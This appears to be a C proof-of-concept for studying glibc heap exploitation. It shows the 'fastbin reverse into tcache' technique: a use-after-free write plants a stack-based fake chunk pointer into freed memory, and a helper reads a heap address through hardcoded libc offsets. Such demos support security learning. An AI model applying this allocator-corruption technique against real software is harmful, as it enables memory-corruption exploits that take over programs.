#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{    
    size_t* chunkarray[0x10];
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x10);
    }
    size_t* chunk1=malloc(0x10);
    size_t* chunk2=malloc(0x10);
    malloc(0x10);
     for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    free(chunk1);
    free(chunk2);
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x10);
    }
    size_t fakechunk[0x20];
    chunk1[0]=fakechunk;
    fakechunk[2]=NULL;
    size_t* chunk3=malloc(0x10);
    printf("fakechunk[2] %p\n",fakechunk[2]);
    printf("chunk2 %p\n",chunk1);

}